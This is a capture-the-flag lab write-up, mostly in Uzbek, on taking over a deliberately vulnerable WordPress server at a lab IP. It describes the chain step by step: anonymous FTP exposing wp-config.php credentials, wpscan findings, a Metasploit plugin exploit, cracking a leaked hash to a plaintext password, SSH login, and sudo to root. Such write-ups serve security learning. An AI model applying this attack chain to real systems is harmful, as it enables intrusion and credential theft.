# rootaccess574
🔐 HF2019 LAB — FULL PWN (Write-up)

🎯 Maqsad: Vulnerable WordPress serverni egallash
🛠 OS: Kali Linux
📍 Target: 10.0.2.7

🔍 Recon & Enumeration

netdiscover → target IP topildi

nmap -sV -A →

21/tcp — FTP (anonymous ON ❗️)

22/tcp — SSH

80/tcp — Apache + WordPress 5.2.3 (ESKI)

10000/tcp — Webmin

📂 FTP Misconfiguration

Anonymous FTP orqali butun WordPress fayllari ochiq

wp-config.php dan DB credentiallar olindi

🌐 WordPress Analysis

wpscan →

XML-RPC enabled

Upload directory listing ON

User: webmaster

Vulnerable plugin: wp-google-maps

💥 Exploitation

Metasploit orqali wp-google-maps exploit

WordPress hash olindi:

$P$BsqOdiLTcye6AS1ofreys4GzRlRvSr1

🔓 Password Cracking

john + rockyou.txt

Natija:

webmaster : kittykat1

🧑‍💻 Initial Access
ssh webmaster@10.0.2.7


✅ User access + flag.txt

👑 Privilege Escalation
sudo -l
sudo su


🔥 ROOT ACCESS OLINADI

✅ Xulosa

Bu lab’da quyidagi xatolar exploit qilindi:

FTP anonymous access

Eskirgan WordPress

Zaif plugin

Kuchsiz parol

Sudo misconfiguration

📌 Real hayotda juda xavfli kombinatsiya
